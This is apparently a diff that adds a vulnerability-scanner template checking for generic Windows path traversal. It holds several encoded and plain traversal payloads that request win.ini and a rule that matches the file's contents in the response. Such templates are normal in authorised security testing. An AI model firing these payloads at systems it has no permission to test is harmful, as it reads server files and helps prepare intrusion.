@@ -1,0 +1,25 @@
+id: poc-yaml-generic-path-traversal-windows
+info:
+  name: 通用路径穿越漏洞 (Windows)
+  severity: high
+  tags:
+  - 目录遍历
+  finger: ''
+variables:
+  r_path: '/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
+
+    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
+
+    /../../../../../../../../../../../../windows/win.ini
+
+    /c:\\windows\\win.ini
+
+    /c:/windows/win.ini'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  expression: 'status_code == 200 && contains(body, "; for 16-bit app support") &&
+    !contains(body, "<")
+
+    '
+transport: http
